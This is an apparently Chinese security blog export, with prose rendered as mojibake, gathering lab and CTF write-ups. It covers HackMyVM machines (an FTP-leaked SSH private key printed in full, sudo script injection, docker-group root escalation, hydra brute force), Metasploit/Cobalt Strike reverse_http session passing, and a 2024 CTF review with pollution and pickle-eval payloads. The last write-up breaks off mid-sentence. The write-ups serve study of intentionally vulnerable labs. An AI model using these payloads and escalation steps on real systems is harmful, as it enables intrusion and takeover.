        4096 Jul 10  2020 share\n~~~\n\næœ‰ä¸€ä¸ªshareæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹æœ‰id_rsaå’Œnote.txt\n\n~~~\nftp> ls\n229 Entering Extended Passive Mode (|||53927|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa\n-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt\n226 Directory send OK.\n~~~\n\ngetä¸‹è½½ä¸‹æ¥\n\n~~~\nftp> get id_rsa\nlocal: id_rsa remote: id_rsa\n229 Entering Extended Passive Mode (|||26918|)\n150 Opening BINARY mode data connection for id_rsa (2602 bytes).\n100% |***************************************************************************|  2602      350.29 KiB/s    00:00 ETA\n226 Transfer complete.\n2602 bytes received in 00:00 (308.45 KiB/s)\nftp> get note.txt\nlocal: note.txt remote: note.txt\n229 Entering Extended Passive Mode (|||52418|)\n150 Opening BINARY mode data connection for note.txt (75 bytes).\n100% |***************************************************************************|    75       34.79 KiB/s    00:00 ETA\n226 Transfer complete.\n75 bytes received in 00:00 (21.66 KiB/s)\n~~~\n\næ–‡ä»¶å†…å®¹\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# cat note.txt\n\nWow you are here\n\nariana won't happy about this note\n\nsorry ariana :(\n~~~\n\nç»™äº†sshçš„ç§é’¥å’Œç”¨æˆ·å,ç»™id_rsaæ–‡ä»¶600çš„æƒé™ç„¶åç™»å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ssh ariana@192.168.31.51 -i id_rsa\nThe authenticity of host '192.168.31.51 (192.168.31.51)' can't be established.\nED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.31.51' (ED25519) to the list of known hosts.\nLinux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Jul 10 13:03:23 2020 from 192.168.18.70\nariana@pwned:~$ ls\nariana-personal.diary  user1.txt\n~~~\n\n# ææƒ\n\n~~~\nariana@pwned:/$ sudo -l\nMatching Defaults entries for ariana on pwned:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser ariana may run the following commands on pwned:\n    (selena) NOPASSWD: /home/messenger.sh\n~~~\n\nå¯ä»¥ä»¥selenaç”¨æˆ·ï¼Œæ— å¯†ç è¿è¡Œ/home/messenger.sh\n\nmessenger.shçš„å†…å®¹ï¼š\n\n~~~\nariana@pwned:/home$ cat messenger.sh\n#!/bin/bash\n\nclear\necho \"Welcome to linux.messenger \"\n                echo \"\"\nusers=$(cat /etc/passwd | grep home |  cut -d/ -f 3)\n                echo \"\"\necho \"$users\"\n                echo \"\"\nread -p \"Enter username to send message : \" name\n                echo \"\"\nread -p \"Enter message for $name :\" msg\n                echo \"\"\necho \"Sending message to $name \"\n\n$msg 2> /dev/null\n\n                echo \"\"\necho \"Message sent to $name :) \"\n                echo \"\"\n~~~\n\nç›´æ¥sudoè¿è¡Œå¯ä»¥ææƒåˆ°selenaï¼Œç„¶åç”¨pythonè·å–ä¼ªç»ˆç«¯\n\n~~~\nariana@pwned:/home$ sudo -u selena /home/messenger.sh\nWelcome to linux.messenger\n\n\nariana:\nselena:\nftpuser:\n\nEnter username to send message : selena\n\nEnter message for selena :bash\n\nSending message to selena\nid\nuid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nselena@pwned:/home$\n~~~\n\nselenaçš„ä¸»ç›®å½•ä¸‹æœ‰ä¸€ä¸ªuser2.txt\n\né€šè¿‡idèƒ½çœ‹åˆ°ç”¨æˆ·åœ¨dockerç»„é‡Œ\n\n~~~\nselena@pwned:/$ id\nuid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)\n~~~\n\n~~~\nselena@pwned:/$ docker images\nREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\nprivesc             latest              09ae39f0f8fc        4 years ago         88.3MB\n<none>              <none>              e13ad046d435        4 years ago         88.3MB\nalpine              latest              a24bb4013296        4 years ago         5.57MB\ndebian              wheezy              10fcec6d95c4        5 years ago         88.3MB\n~~~\n\n[dockerææƒ](https://gtfobins.github.io/gtfobins/docker/)\n\n~~~\nselena@pwned:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\nid\n# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n~~~\n\nææƒæˆåŠŸ\n\n# æ€»ç»“\n\né»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker è½¯ä»¶åŒ…æ˜¯ä¼šé»˜è®¤æ·»åŠ ä¸€ä¸ª docker ç”¨æˆ·ç»„çš„ã€‚Docker å®ˆæŠ¤è¿›ç¨‹ä¼šå…è®¸ root ç”¨æˆ·å’Œ dockerç»„ç”¨æˆ·è®¿é—® Dockerï¼Œç»™ç”¨æˆ·æä¾› Docker æƒé™ï¼›ç”¨æˆ·åœ¨dockerç»„é‡Œå°±å¯ä»¥å…sudoè¿è¡Œdockerï¼Œè€Œå®¹å™¨å†…é»˜è®¤æ˜¯rootç”¨æˆ·ï¼Œç”¨-vé€‰é¡¹å°†ç”¨æˆ·å¤–çš„ç›®å½•æ˜ å°„åˆ°å®¹å™¨å†…æ—¢å¯ä»¥ä»¥rootç”¨æˆ·å»ä¿®æ”¹æ–‡ä»¶\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Gift","url":"/2025/01/22/HackmyVM-Gift/","content":"\n\n\n\n\n\n\n\n\n\n\n# ä¿¡æ¯æœé›†\n\nç”¨arp-scanæ‰«æ\n\n~~~shell\nâ”Œâ”€â”€(rootã‰¿kali)-[~]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.200  08:00:27:5f:2f:1e       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.217  b4:0f:b3:8e:31:07       vivo Mobile Communication Co., Ltd.\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 5 responded\n~~~\n\nipåœ°å€ä¸º192.168.31.200ï¼Œç„¶ånmapæ‰«æå¼€æ”¾çš„ç«¯å£\n\n~~~shell\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.200 --min-rate=1000\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 00:40 EST\nNmap scan report for gift (192.168.31.200)\nHost is up (0.0080s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:5F:2F:1E (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.96 seconds\n~~~\n\nåªå¼€å¯äº†22å’Œ80ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# curl http://192.168.31.200/\n\nDont Overthink. Really, Its simple.\n        <!-- Trust me -->\n~~~\n\nç›®å½•æ‰«æä¹Ÿåªæœ‰ä¸€ä¸ªindex.html,80ç«¯å£æ²¡æœ‰å…¥å£ç‚¹ï¼Œåªèƒ½æ‰¾22ç«¯å£,ç”¨hydraçˆ†ç ´rootå¯†ç \n\n~~~\n[22][ssh] host: 192.168.31.200   login: root   password: simple\n~~~\n\n# SSHç™»å½•\n\nssh root@192.168.31.200\n\nèƒ½ç›´æ¥æŸ¥çœ‹root.txtå’Œuser.txt\n\n\n\n# æ€»ç»“\n\nDont Overthink. Really, Its simple.ï¼ŒEasyé¶åœº,hydraç›´æ¥çˆ†ç ´æ²¡ä»€ä¹ˆå¥½è¯´çš„\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"è®°çº¢æ—¥é¶åœº2è¿‡ç¨‹ä¸­çš„ä¸è¶³","url":"/2024/11/11/è®°çº¢æ—¥é¶åœº2è¿‡ç¨‹ä¸­çš„ä¸è¶³/","content":"\n\n\n\n\n\n\n# msfæ´¾ç”Ÿcs\n\n~~~\n#msf\nbackground\nuse exploit/windows/local/payload_inject\nset payload windows/meterpreter/reverse_http\nset DisablePayloadHandler true\nset lhost 192.168.116.131\nset lport 9000\nset session 2\nrun\n~~~\n\ncsçš„ç›‘å¬è¦å’Œlportçš„ç«¯å£ä¸€æ ·\n\n# csæ´¾ç”Ÿmsf\n\n~~~\n#msf\nbackground\nuse payload payload/windows/meterpreter/reverse_http\nset lhost 192.168.116.131\nset lport 9001\nrun\n~~~\n\ncsæ–°å»ºä¸€ä¸ªforeing httpç›‘å¬è®¾ç½®å’Œmsfçš„è®¾ç½®ä¸€æ ·ï¼Œç„¶åcsæ–°å»ºä¼šè¯åˆ°è¿™ä¸ªç›‘å¬å™¨å³å¯ã€‚\n\n---\n\nå…¶å®ä¸æ­¢è¿™ä¹ˆå¤šï¼ŒåŒ…æ‹¬è¿›ç¨‹è¿ç§»ï¼Œç¥¨æ®ä¹‹ç±»çš„ä¸€ä¸ªcså…¨éƒ¨æå®šäº†å°±ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æƒ³å°è¯•ä¸€ä¸‹æ€ä¹ˆç”¨çº¯æ‰‹åŠ¨æ‰“é¶è€Œä¸”æ‰“é¶ç¯å¢ƒè¿‡äºç†æƒ³å®Œå…¨æ²¡æœ‰è€ƒè™‘è¿‡æµé‡ç‰¹å¾çš„é—®é¢˜ï¼Œæœ‰æœºä¼šäº†è¡¥ä¸€ç¯‡ï¼Œå†…ç½‘çš„å­¦ä¹ è·¯æ¼«æ¼«ã€‚\n\n","tags":["å†…ç½‘"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"2024å¼ºç½‘æ‹Ÿæ€å¤ç›˜","url":"/2024/10/21/2024å¼ºç½‘æ‹Ÿæ€å¤ç›˜/","content":"\n\n\n\n\nwebå¤ç›˜ä¸€ä¸‹å§åªåšå‡ºæ¥äº†ä¸¤é“ï¼Œæ‰€æœ‰é¢˜éƒ½æœ‰ä¸€ç‚¹æ€è·¯ï¼Œä½†æ˜¯åªæœ‰ä¸€ç‚¹ç‚¹å¯æƒœå¯æƒœï¼Œå¤ªå¯æƒœäº†ã€‚\n\n# capoo\n\nè¿™æ˜¯ä¸ªéé¢„æœŸï¼Œcapoo.phpå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œèƒ½è¯»å–åˆ°start.sh,start.shä¸­æ³„éœ²äº†flagçš„åå­—ï¼Œç›´æ¥è¯»å–å°±è¡Œ\n\n# ez_picker\n\n~~~python\n#æºç \nfrom sanic import Sanic\nfrom sanic.response import json,file as file_,text,redirect\nfrom sanic_cors import CORS\nfrom key import secret_key\nimport os\nimport pickle\nimport time\nimport jwt\nimport io\nimport builtins\napp = Sanic(\"App\")\npickle_file = \"data.pkl\"\nmy_object = {}\nusers = []\n\nsafe_modules = {\n    'math',\n    'datetime',\n    'json',\n    'collections',\n}\n\nsafe_names = {\n    'sqrt', 'pow', 'sin', 'cos', 'tan',\n    'date', 'datetime', 'timedelta', 'timezone', \n    'loads', 'dumps',  \n    'namedtuple', 'deque', 'Counter', 'defaultdict'\n}\n\nclass RestrictedUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        if module in safe_modules and name in safe_names:\n            return getattr(builtins, name)\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" %(module, name))\n    \ndef restricted_loads(s):\n    return RestrictedUnpickler(io.BytesIO(s)).load()\n\nCORS(app, supports_credentials=True, origins=[\"http://localhost:8000\", \"http://127.0.0.1:8000\"])\nclass User:\n    def __init__(self,username,password):\n        self.username=username\n        self.password=password\n        \n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\ndef token_required(func):\n    async def wrapper(request, *args, **kwargs):\n        token = request.cookies.get(\"token\")  \n        if not token:\n            return redirect('/login')\n        try:\n            result=jwt.decode(token, str(secret_key), algorithms=['HS256'], options={\"verify_signature\": True})\n        except jwt.ExpiredSignatureError:\n            return json({\"status\": \"fail\", \"message\": \"Token expired\"}, status=401)\n        except jwt.InvalidTokenError:\n            return json({\"status\": \"fail\", \"message\": \"Invalid token\"}, status=401)\n        print(result)\n        if result[\"role\"]!=\"admin\":\n            return json({\"status\": \"fail\", \"message\": \"Permission Denied\"}, status=401)\n        return await func(request, *args, **kwargs)\n    return wrapper\n\n@app.route('/', methods=[\"GET\"])\ndef file_reader(request):\n    file = \"app.py\"\n    with open(file, 'r') as f:\n        content = f.read()\n    return text(content)\n\n@app.route('/upload', methods=[\"GET\",\"POST\"])\n@token_required\nasync def upload(request):\n    if request.method==\"GET\":\n        return await file_('templates/upload.html')\n    if not request.files:\n        return text(\"No file provided\", status=400)\n\n    file = request.files.get('file')\n    file_object = file[0] if isinstance(file, list) else file\n    try:\n        new_data = restricted_loads(file_object.body)\n        try:\n            my_object.update(new_data)\n        except:\n            return json({\"status\": \"success\", \"message\": \"Pickle object loaded but not updated\"})\n        with open(pickle_file, \"wb\") as f:\n            pickle.dump(my_object, f)\n\n        return json({\"status\": \"success\", \"message\": \"Pickle object updated\"})\n    except pickle.UnpicklingError:\n        return text(\"Dangerous pickle file\", status=400)\n    \n@app.route('/register', methods=['GET','POST'])\nasync def register(request):\n    if request.method=='GET':\n        return await file_('templates/register.html')\n    if request.json:\n        NewUser=User(\"username\",\"password\")\n        merge(request.json, NewUser)\n        users.append(NewUser)\n    else:\n        return json({\"status\": \"fail\", \"message\": \"Invalid request\"}, status=400)\n    return json({\"status\": \"success\", \"message\": \"Register Success!\",\"redirect\": \"/login\"})\n\n@app.route('/login', methods=['GET','POST'])\nasync def login(request):\n    if request.method=='GET':\n        return await file_('templates/login.html')\n    if request.json:\n        username = request.json.get(\"username\")\n        password = request.json.get(\"password\")\n        if not username or not password:\n            return json({\"status\": \"fail\", \"message\": \"Username or password missing\"}, status=400)\n        user = next((u for u in users if u.username == username), None)\n        if user:\n            if user.password == password:\n                data={\"user\":username,\"role\":\"guest\"}\n                data['exp'] = int(time.time()) + 60 *5\n                token = jwt.encode(data, str(secret_key), algorithm='HS256')\n                response = json({\"status\": \"success\", \"redirect\": \"/upload\"})\n                response.cookies[\"token\"]=token\n                response.headers['Access-Control-Allow-Origin'] = request.headers.get('origin')\n                return response\n            else:\n                return json({\"status\": \"fail\", \"message\": \"Invalid password\"}, status=400)\n        else:\n            return json({\"status\": \"fail\", \"message\": \"User not found\"}, status=404)\n    return json({\"status\": \"fail\", \"message\": \"Invalid request\"}, status=400)\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=8000)\n~~~\n\nè€ƒç‚¹å°±æ˜¯åŸå‹é“¾æ±¡æŸ“+pickleååºåˆ—åŒ–+jwtä¼ªé€ ï¼Œæˆ‘å½“æ—¶æ„Ÿè§‰æœ€éš¾çš„æ˜¯é‚£ä¸ªpickleååºåˆ—åŒ–ï¼Œå› ä¸ºä»–æ˜¯ç™½åå•è™½ç„¶å¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“è¿›è¡Œä¿®æ”¹ä½†æ˜¯è¿™æ˜¯ç”±äºå¯¹åŸç†ä»¥åŠå†…å»ºæ¨¡å—çš„ä¸ç†Ÿæ‚‰å¯¼è‡´çš„ï¼Œå…¶å®åªéœ€è¦æŠŠç”¨åˆ°çš„æ¨¡å—å’Œå‘½ä»¤åŠ å…¥å°±è¡Œæ¯”å¦‚`builtins`ã€`getattr`ã€`popen`åŠ å…¥å°±å¥½äº†\n\n~~~python\n#æ±¡æŸ“é“¾\n{\"__init__\":{\nÂ Â Â Â Â Â Â Â \"__globals__\":{\nÂ Â Â Â Â Â Â Â Â Â Â Â \"secret_key\":\"66666\",\nÂ Â Â Â Â Â Â Â Â Â Â Â \"safe_modules\":[\"os\"],\nÂ Â Â Â Â Â Â Â Â Â Â Â \"safe_names\":[\"eval\"],\nÂ Â Â Â Â Â Â Â }\nÂ Â Â Â }\n}\n~~~\n\n~~~python\n#pickleé“¾\nb'''(cos\neval\nS'os.system(\\\"calc\\\")'\no.'''\n~~~\n\n# Spreader\n\n~~~js\n# app.js\nconst express = require('express');\nconst session = require('express-session');\nconst stringRandom = require('string-random');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst port = 3000;\nconst AdminPassWord=stringRandom(16, { numbers: true })\nconst PrivilegedPassWord=stringRandom(16, { numbers: true })\nconst PlainPassWord=stringRandom(16, { numbers: true })\nconst secret_key=stringRandom(16, { numbers: true })\nconst users = [];\nconst posts = [];\nconst store = [];\nusers.push({ username:\"admin\", password:AdminPassWord, role: \"admin\" });\nusers.push({ username:\"privileged\", password:PrivilegedPassWord, role: \"privileged\" });\nusers.push({ username:\"plain\", password:PlainPassWord, role: \"plain\" });\nconsole.log(users)\napp.use(express.static('views'));\napp.set('view engine', 'ejs');\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({\n    secret: secret_key,\n    resave: false,\n    saveUninitialized: true,\n    cookie: {\n        httpOnly: false,\n        secure: false,\n    }\n}));\n\n\napp.use('/', require('./index')(users,posts,store,AdminPassWord,PrivilegedPassWord));\n\napp.listen(port, () => {\n    console.log(`App is running on http://localhost:${port}`);\n});\n\n~~~\n\n~~~js\n#bot.js\nconst puppeteer = require('puppeteer');\n\nasync function triggerXSS(UserName, PassWord) {\n    const browser = await puppeteer.launch({\n        args: ['--no-sandbox', '--disable-setuid-sandbox'],\n        executablePath: '/usr/bin/chromium',\n        headless: true\n    });\n\n    const page = await browser.newPage();\n\n    await page.goto('http://localhost:3000/login');\n\n    await page.type('input[name=\"username\"]', UserName);\n    await page.type('input[name=\"password\"]', PassWord);\n\n    await page.click('button[type=\"submit\"]');\n\n    await page.goto('http://localhost:3000/');\n\n    await browser.close();\n\n    return;\n}\n\nmodule.exports = { triggerXSS };\n\n~~~\n\n~~~js\n#index.js\nconst fs = require('fs');\nconst express = require('express');\nconst router = express.Router();\nconst { triggerXSS } = require('../bot');\nconst { Store } = require('express-session');\nfunction isAuthenticated(req, res, next) {\n    if (req.session.user) {\n        next();\n    } else {\n        res.redirect('/login');\n    }\n}\nmodule.exports = (users,posts,store,AdminPassWord,PrivilegedPassWord) => {\n\n    const ROLES = {\n        PLAIN: \"plain\",\n        PRIVILEGED: \"privileged\",\n        ADMIN: \"admin\",\n    };\n\n    router.get('/register', (req, res) => {\n        res.sendFile('register.html', { root: './views' });\n    });\n\n    router.post('/register', (req, res) => {\n        const { username, password, role } = req.body;\n        const userExists = users.some(u => u.username === username);\n        if (userExists) {\n            return res.send('Username already exists!');\n        }\n        users.push({ username, password, role: \"plain\" });\n        res.redirect('/login');\n    });\n    router.get('/login', (req, res) => {\n        res.sendFile('login.html', { root: './views' });\n    });\n\n    router.post('/login', (req, res) => {\n        const { username, password } = req.body;\n        console.log(username);\n        console.log(password);\n        const user = users.find(u => u.username === username && u.password === password);\n        if (user) {\n            req.session.user = user;\n            res.redirect('/');\n        } else {\n            res.send('Invalid credentials!');\n        }\n    });\n    router.get('/', isAuthenticated, (req, res) => {\n        const currentUser = req.session.user;\n        let filteredPosts = [];\n        if (currentUser.role === ROLES.ADMIN) {\n            filteredPosts = posts.filter(p => p.role === ROLES.PRIVILEGED || p.role === ROLES.ADMIN);\n        } else if (currentUser.role === ROLES.PRIVILEGED) {\n            filteredPosts = posts.filter(p => p.role === ROLES.PLAIN || p.role === ROLES.PRIVILEGED);\n        } else {\n            filteredPosts = posts.filter(p => p.role === ROLES.PLAIN);\n        }\n        res.render(`${currentUser.role}`, { posts: filteredPosts, user: currentUser });\n    });\n    router.post('/post', isAuthenticated, (req, res) => {\n        let { content } = req.body;\n    \n        const scriptTagRegex = /<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi;\n        content = content.replace(scriptTagRegex, '[XSS attempt blocked]');\n\n        const eventHandlerRegex = /on\\w+\\s*=\\s*([\"']).*?\\1/gi;\n        content = content.replace(eventHandlerRegex, '[XSS attempt blocked]');\n    \n        const javascriptURLRegex = /(?:href|src)\\s*=\\s*([\"'])\\s*javascript:.*?\\1/gi;\n        content = content.replace(javascriptURLRegex, '[XSS attempt blocked]');\n    \n        const dataURLRegex = /(?:href|src)\\s*=\\s*([\"'])\\s*data:.*?\\1/gi;\n        content = content.replace(dataURLRegex, '[XSS attempt blocked]');\n    \n        const cssExpressionRegex = /style\\s*=\\s*([\"']).*?expression\\([^>]*?\\).*?\\1/gi;\n        content = content.replace(cssExpressionRegex, '[XSS attempt blocked]');\n    \n        const dangerousTagsRegex = /<\\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^>]*?>/gi;\n        content = content.replace(dangerousTagsRegex, '[XSS attempt blocked]');\n    \n        const dangerousAttributesRegex = /\\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\\s*=\\s*([\"']).*?\\1/gi;\n        content = content.replace(dangerousAttributesRegex, '[XSS attempt blocked]');\n    \n        const dangerousProtocolsRegex = /(?:href|src)\\s*=\\s*([\"'])(?:\\s*javascript:|vbscript:|file:|data:|filesystem:).*?\\1/gi;\n        content = content.replace(dangerousProtocolsRegex, '[XSS attempt blocked]');\n    \n        const dangerousFunctionsRegex = /\\b(?:eval|alert|prompt|confirm|console\\.log|Function)\\s*\\(/gi;\n        content = content.replace(dangerousFunctionsRegex, '[XSS attempt blocked]');\n    \n        posts.push({ content: content, username: req.session.user.username, role: req.session.user.role });\n        res.redirect('/');\n    });\n    \n    \n    router.get('/logout', (req, res) => {\n        req.session.destroy();\n        res.redirect('/login');\n    });\n    router.get('/report_admin', async (req, res) => {\n        try {\n            await triggerXSS(\"admin\",AdminPassWord);\n            res.send(`Admin Bot successfully logged in.`);\n        } catch (error) {\n            console.error('Error Reporting:', error);\n            res.send(`Admin Bot successfully logged in.`);\n        }\n    });\n    router.get('/report_privileged', async (req, res) => {\n        try {\n            await triggerXSS(\"privileged\",PrivilegedPassWord);\n            res.send(`Privileged Bot successfully logged in.`);\n        } catch (error) {\n            console.error('Error Reporting:', error);\n            res.send(`Privileged Bot successfully logged in.`);\n        }\n    });\n    router.get('/store', async (req, res) => {\n        return res.status(200).json(store);\n    });\n    router.post('/store', async (req, res) => {\n        if (req.body) {\n            store.push(req.body);\n            return res.status(200).send('Data stored successfully');\n        } else {\n            return res.status(400).send('No data received');\n        }\n    });\n    router.get('/flag', async (req, res) => {\n        try {\n            if (req.session.user && req.session.user.role === \"admin\") {\n                fs.readFile('/flag', 'utf8', (err, data) => {\n                    if (err) {\n                        console.error('Error reading flag file:', err);\n                        return res.status(500).send('Internal Server Error');\n                    }\n                    res.send(`Your Flag Here: ${data}`);\n                });\n            } else {\n                res.status(403).send('Unauthorized!');\n            }\n        } catch (error) {\n            console.error('Error fetching flag:', error);\n            res.status(500).send('Internal Server Error');\n        }\n    });\n    return router;\n};\n\n~~~\n\nè¿™ä¸ªé¢˜ä¸€çœ¼xsså˜›ï¼Œç„¶åæœ‰ä¸¤ç§è§£é¢˜æ€è·¯ï¼Œä¸€ä¸ªæ˜¯æ’å…¥jsä»£ç åˆ©ç”¨/storeè·¯ç”±ï¼Œç„¶åè®¿é—®/report_privilegedå°†privilegeç”¨æˆ·çš„cookieå‚¨å­˜åˆ°/storeä¸­ï¼Œç„¶ååŒæ 